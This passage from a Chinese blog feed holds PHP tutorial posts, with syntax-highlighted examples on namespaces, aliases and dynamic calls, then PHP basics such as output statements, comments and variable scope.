keyword">function</span> getCommentTotal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> 300<span class="token punctuation">;</span><span class="token punctuation">}</span>class Comment <span class="token punctuation">{</span> <span class="token punctuation">}</span>//调用当前空间的常量、函数和类<span class="token keyword">echo</span> PATH<span class="token punctuation">;</span> ///message_board<span class="token keyword">echo</span> getCommentTotal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //300<span class="token variable">$comment</span> <span class="token operator">=</span> new Comment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//调用Article空间的常量、函数和类<span class="token keyword">echo</span> \Article\PATH<span class="token punctuation">;</span> ///article<span class="token keyword">echo</span> \Article\getCommentTotal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //100<span class="token variable">$article_comment</span> <span class="token operator">=</span> new \Article\Comment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我的确得到了Article空间的元素数据。<br>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>子空间</strong></font><br>命名空间的调用语法像文件路径一样是有道理的，它允许我们自定义子空间来描述各个空间之间的关系。<br>抱歉我忘了说，article和message board这两个模块其实都是处于同一个blog项目内。如果用命名空间来表达它们的关系，是这样：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//我用这样的命名空间表示处于blog下的article模块</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//我用这样的命名空间表示处于blog下的message board模块</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>MessageBoard</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用当前空间的类</span><span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用Blog\Article空间的类</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Blog<span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而且，子空间还可以定义很多层次，比如说 Blog\Article\Archives\Date</p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>公共空间</strong></font><br>我有一个common_inc.php脚本文件，里面有一些好用的函数和类：</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> getIP<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>class FilterXSS <span class="token punctuation">{</span> <span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS">在一个命名空间里引入这个脚本，脚本里的元素不会归属到这个命名空间。如果这个脚本里没有定义其它命名空间，它的元素就始终处于公共空间中：<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpnamespace Blog\Article<span class="token punctuation">;</span>//引入脚本文件include <span class="token string">'./common_inc.php'</span><span class="token punctuation">;</span><span class="token variable">$filter_XSS</span> <span class="token operator">=</span> new FilterXSS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //出现致命错误：找不到Blog\Article\FilterXSS类<span class="token variable">$filter_XSS</span> <span class="token operator">=</span> new \FilterXSS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //正确?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><br>调用公共空间的方式是直接在元素名称前加 \ 就可以了，否则PHP解析器会认为我想调用当前空间下的元素。除了自定义的元素，还包括PHP自带的元素，都属于公共空间。<br>要提一下，其实公共空间的函数和常量不用加 \ 也可以正常调用（不明白PHP为什么要这样做），但是为了正确区分元素，还是建议调用函数的时候加上 \</font></p><p><strong>名称术语</strong><br>在说别名和导入之前，需要知道关于空间三种名称的术语，以及PHP是怎样解析它们的。官方文档说得非常好，我就直接拿来套了。</p><p>1.非限定名称，或不包含前缀的类名称，例如 $comment = new Comment();。如果当前命名空间是Blog\Article，Comment将被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p><p>2.限定名称，或包含前缀的名称，例如 $comment = new Article\Comment();。如果当前的命名空间是Blog，则Comment会被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p><p>3.完全限定名称，或包含了全局前缀操作符的名称，例如 $comment = new \Article\Comment();。在这种情况下，Comment总是被解析为代码中的文字名(literal name)Article\Comment。</p><p>其实可以把这三种名称类比为文件名（例如 comment.php）、相对路径名（例如 ./article/comment.php）、绝对路径名（例如 /blog/article/comment.php），这样可能会更容易理解。</p><p>我用了几个示例来表示它们：<br></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//创建空间Blog</span><span class="token keyword">namespace</span> <span class="token package">Blog</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//非限定名称，表示当前Blog空间</span><span class="token comment" spellcheck="true">//这个调用将被解析成 Blog\Comment();</span><span class="token variable">$blog_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//限定名称，表示相对于Blog空间</span><span class="token comment" spellcheck="true">//这个调用将被解析成 Blog\Article\Comment();</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//类前面没有反斜杆\</span><span class="token comment" spellcheck="true">//完全限定名称，表示绝对于Blog空间</span><span class="token comment" spellcheck="true">//这个调用将被解析成 Blog\Comment();</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Blog<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//类前面有反斜杆\</span><span class="token comment" spellcheck="true">//完全限定名称，表示绝对于Blog空间</span><span class="token comment" spellcheck="true">//这个调用将被解析成 Blog\Article\Comment();</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Blog<span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//类前面有反斜杆\</span><span class="token comment" spellcheck="true">//创建Blog的子空间Article</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS">其实之前我就一直在使用非限定名称和完全限定名称，现在它们终于可以叫出它们的名称了。<br><strong>别名和导入</strong><br>别名和导入可以看作是调用命名空间元素的一种快捷方式。PHP并不支持导入函数或常量。<br>它们都是通过使用use操作符来实现：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建一个BBS空间（我有打算开个论坛）</span><span class="token keyword">namespace</span> <span class="token package">BBS</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//导入一个命名空间</span><span class="token keyword">use</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//导入命名空间后可使用限定名称调用元素</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为命名空间使用别名</span><span class="token keyword">use</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span> <span class="token keyword">as</span> Arte<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用别名代替空间名</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arte<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//导入一个类</span><span class="token keyword">use</span> <span class="token package">Blog<span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Comment</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//导入类后可使用非限定名称调用元素</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为类使用别名</span><span class="token keyword">use</span> <span class="token package">Blog<span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Comment</span> <span class="token keyword">as</span> Comt<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用别名代替空间名</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Comt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我注意到，如果导入元素的时候，当前空间有相同的名字元素将会怎样？显然结果会发生致命错误。<br>例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpnamespace Blog\Article<span class="token punctuation">;</span>class Comment <span class="token punctuation">{</span> <span class="token punctuation">}</span>namespace BBS<span class="token punctuation">;</span>class Comment <span class="token punctuation">{</span> <span class="token punctuation">}</span>Class Comt <span class="token punctuation">{</span> <span class="token punctuation">}</span>//导入一个类use Blog\Article\Comment<span class="token punctuation">;</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> new Comment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //与当前空间的Comment发生冲突，程序产生致命错误//为类使用别名use Blog\Article\Comment as Comt<span class="token punctuation">;</span><span class="token variable">$article_comment</span> <span class="token operator">=</span> new Comt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //与当前空间的Comt发生冲突，程序产生致命错误?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>动态调用</strong><br>PHP提供了namespace关键字和__NAMESPACE__魔法常量动态的访问元素，__NAMESPACE__可以通过组合字符串的形式来动态访问：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PATH</span> <span class="token operator">=</span> <span class="token string">'/Blog/article'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Comment</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//namespace关键字表示当前空间</span><span class="token keyword">echo</span> <span class="token keyword">namespace</span>\<span class="token package">PATH</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">///Blog/article</span><span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">namespace<span class="token punctuation">\</span>Comment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//魔法常量__NAMESPACE__的值是当前空间名称</span><span class="token keyword">echo</span> <span class="token constant">__NAMESPACE__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Blog\Article</span><span class="token comment" spellcheck="true">//可以组合成字符串并调用</span><span class="token variable">$comment_class_name</span> <span class="token operator">=</span> <span class="token constant">__NAMESPACE__</span> <span class="token punctuation">.</span> <span class="token string">'\Comment'</span><span class="token punctuation">;</span><span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$comment_class_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符串形式调用问题<br>上面的动态调用的例子中，我们看到了字符串形式的动态调用方式，如果要使用这种方式要注意两个问题。<br><font color="red"><strong>1. 使用双引号的时候特殊字符可能被转义</strong></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpnamespace Blog\Article<span class="token punctuation">;</span>class name <span class="token punctuation">{</span> <span class="token punctuation">}</span>//我是想调用Blog\Article\name<span class="token variable">$class_name</span> <span class="token operator">=</span> __NAMESPACE__ <span class="token keyword">.</span> <span class="token string">"\name"</span><span class="token punctuation">;</span> //但是\n将被转义为换行符<span class="token variable">$name</span> <span class="token operator">=</span> new <span class="token variable">$class_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //发生致命错误?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>2. 不会认为是限定名称</strong></font><br>PHP在编译脚本的时候就确定了元素所在的空间，以及导入的情况。而在解析脚本时字符串形式调用只能认为是非限定名称和完全限定名称，而永远不可能是限定名称。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Blog</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//导入Common类</span><span class="token keyword">use</span> <span class="token package">Blog<span class="token punctuation">\</span>Article<span class="token punctuation">\</span>Common</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//我想使用非限定名称调用Blog\Article\Common</span><span class="token variable">$common_class_name</span> <span class="token operator">=</span> <span class="token string">'Common'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实际会被当作非限定名称，也就表示当前空间的Common类，但我当前类没有创建Common类</span><span class="token variable">$common</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$common_class_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//发生致命错误：Common类不存在</span><span class="token comment" spellcheck="true">//我想使用限定名称调用Blog\Article\Common</span><span class="token variable">$common_class_name</span> <span class="token operator">=</span> <span class="token string">'Article\Common'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实际会被当作完全限定名称，也就表示Article空间下的Common类，但我下面只定义了Blog\Article空间而不是Article空间</span><span class="token variable">$common</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$common_class_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//发生致命错误：Article\Common类不存在</span><span class="token keyword">namespace</span> <span class="token package">Blog<span class="token punctuation">\</span>Article</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Common</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础语法</title>
      <link href="/post/PHP-1/"/>
      <url>/post/PHP-1/</url>
      
        <content type="html"><![CDATA[<p>年後の新作2.14(。・∀・)ノ   </p><p>本文参考PHP中文网：<font color="#00B2EE">[<a href="http://www.php.cn/code/4800.html" target="_blank" rel="noopener">PHP入门教程之一周学会PHP</a>]</font>&emsp;<font color="#00B2EE">[<a href="http://www.php.cn/code/4760.html" target="_blank" rel="noopener">PHP入门视频教程之一周学会PHP</a>]</font><br>资料查阅：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_string.asp" target="_blank" rel="noopener">W3shcool PHP 教程</a>]</font><br>&emsp;<br>&emsp;</p><a id="more"></a><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP</font></center><p>&emsp;</p><h3 id="一、-PHP基础语法"><font color="#FF6347" face="Comic sans MS">一、 PHP基础语法</font><a href="post/PHP-1#一、-PHP基础语法"></a></h3><h4 id="1-1-PHP-语法"><font color="#3CB371" face="Comic sans MS">1.1 PHP 语法</font><a href="post/PHP-1#1-1-PHP-语法"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP基础语法</strong></font><br>PHP 脚本可以放在文档中的任何位置。<br>PHP 脚本以 尖括号、问号、PHP <font color="#00B2EE"><strong>&lt;?php</strong></font>开始，以 <font color="#00B2EE"><strong>?&gt;</strong></font> 问号、尖括号结束。<br>PHP 文件的默认文件扩展名是 “<font color="#00B2EE"><strong>.php</strong></font>“。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php     //这里是我们要写的PHP代码?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><br><font color="red"><strong>2. PHP输出语法</strong></font><br>PHP中<font color="#00B2EE"><strong>echo(), print(), print_r(), var_dump()</strong></font>的区别：<br><font color="#00B2EE"><strong>echo：</strong></font>是PHP语句, 输出一个或多个字符串。实际上它并不是一个函数，所以不必对它使用括号，直接用echo就行。print和print_r是函数,语句没有返回值,函数可以有返回值(即便没有用)。可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</font></p><p><font color="#00B2EE"><strong>print：</strong></font> 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。只能打印出简单类型变量的值，如：int、string。<br>下面的实例演示了如何使用 print 命令输出字符串（字符串可以包含 HTML 标签）：</p><p><font color="#00B2EE"><strong>print_r()：</strong></font><br>可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。</p><p><font color="#00B2EE"><strong>var_dump()：</strong></font><br>var_dump(传入一个变量) 输出变类型和值（最常用）。var_dump() 是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></p><blockquote><blockquote><p>·  echo - 可以输出一个或多个字符串<br>·  print - 只允许输出一个字符串，返回值总为 1<br>提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。<br>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p></blockquote></blockquote><pre class="line-numbers language-bash"><code class="language-bash">echo:<span class="token operator">&lt;</span>?php    <span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"hello world!"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span><span class="token punctuation">;</span>?<span class="token operator">></span>//运行结果：hello world<span class="token operator">!</span>abcprint:<span class="token operator">&lt;</span>?php print <span class="token string">"&lt;h2>PHP is fun!&lt;/h2>"</span><span class="token punctuation">;</span> print <span class="token string">"Hello world!&lt;br>"</span><span class="token punctuation">;</span> print <span class="token string">"I'm about to learn PHP!"</span><span class="token punctuation">;</span> ?<span class="token operator">></span>print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token operator">&lt;</span>?php    <span class="token variable">$age</span><span class="token operator">=</span>array<span class="token punctuation">(</span>18,20,24<span class="token punctuation">)</span><span class="token punctuation">;</span>    print_r<span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>//运行结果：Array <span class="token punctuation">(</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 18 <span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 20 <span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 24 <span class="token punctuation">)</span>var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>:<span class="token operator">&lt;</span>?php    <span class="token variable">$age</span><span class="token operator">=</span>array<span class="token punctuation">(</span>18,20,24<span class="token punctuation">)</span><span class="token punctuation">;</span>    var_dump<span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>//运行结果：array<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> int<span class="token punctuation">(</span>18<span class="token punctuation">)</span> <span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> int<span class="token punctuation">(</span>20<span class="token punctuation">)</span> <span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> int<span class="token punctuation">(</span>24<span class="token punctuation">)</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**注意事项：**</font> php的代码部份全部要用半角的英文、很多人容易写成全角的英文和符号造成PHP代码报错。PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。PHP代码的最后一行可以加也可不加分号。由于很多学习者特别是初学者经常犯一个毛病：写完一行代码不加分号。因此，容易报错。我们通常在公司里面规定：一行代码写完，就必须要加分号。</font></td></tr></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3.PHP中的注释：</strong></font><br><font color="#00B2EE"><strong>单行注释（只注释一行）：</strong></font> <font color="#FF7F00">//</font> 双斜杠表示单行注释,有时也用 # 表示,但用的比较少，多用 <font color="#FF7F00">//</font><br><font color="#00B2EE"><strong>多行注释（注释多行）：</strong></font> 以 <font color="#FF7F00">/* </font> 开始, 以<font color="#FF7F00">*/</font>结束代表多行注释。<br></font> </p><p>&emsp;<br>&emsp;</p><h4 id="1-2-PHP-变量"><font color="#3CB371" face="Comic sans MS">1.2 PHP 变量</font><a href="post/PHP-1#1-2-PHP-变量"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP中的变量有几个特点：</strong></font></font></p><ol><li>必须要以<font color="#FF7F00">$</font>开始。如变量x必须要写成<font color="#FF7F00">$x</font></li><li>变量的首字母不能以数字开始</li><li>变量的名字区分大小写</li><li>变量不要用特殊符号、中文，_不算特殊符号</li><li>变量命名要有意义（别写xxx，aaa，ccc这种 变量名）</li><li>$ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图 </li></ol><pre class="line-numbers language-bash"><code class="language-bash">变量在您第一次赋值给它的时候被创建：在下面的语句执行中，变量txt将保存值Hello world<span class="token operator">!</span>，且变量 x 将保存值 5。<span class="token operator">&lt;</span>?php <span class="token variable">$txt</span><span class="token operator">=</span><span class="token string">"Hello world!"</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">=</span>5<span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">=</span>10.5<span class="token punctuation">;</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. PHP是一门弱类型语言：</strong></font><br>在上面的实例中，我们注意到，不必向 PHP 声明该变量的数据类型。<br>PHP 会根据变量的值，自动把变量转换为正确的数据类型。<br>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。<br></font></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP变量的作用域：</strong></font><font color="#00B2EE"><strong>local、global、static、parameter</strong></font><br><font color="#00B2EE"><strong>局部和全局作用域（loacal  global）：</strong></font>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</font></p><p><font color="#00B2EE"><strong>PHP global 关键字：</strong></font>global 关键字用于函数内访问全局变量。<br>PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。<br></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php <span class="token variable">$x</span><span class="token operator">=</span>10<span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">=</span>20<span class="token punctuation">;</span> <span class="token keyword">function</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     global <span class="token variable">$x</span>,<span class="token variable">$y</span><span class="token punctuation">;</span>      //使用global关键字     <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span>+<span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span>//输出30?<span class="token operator">></span>上面例子也可以写成：<span class="token operator">&lt;</span>?php <span class="token variable">$x</span><span class="token operator">=</span>5<span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">=</span>10<span class="token punctuation">;</span> <span class="token keyword">function</span> myTest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span>+<span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> myTest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong><br>不可在global 后写 $变量 = 值。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">global</span> <span class="token variable">$a</span> <span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span 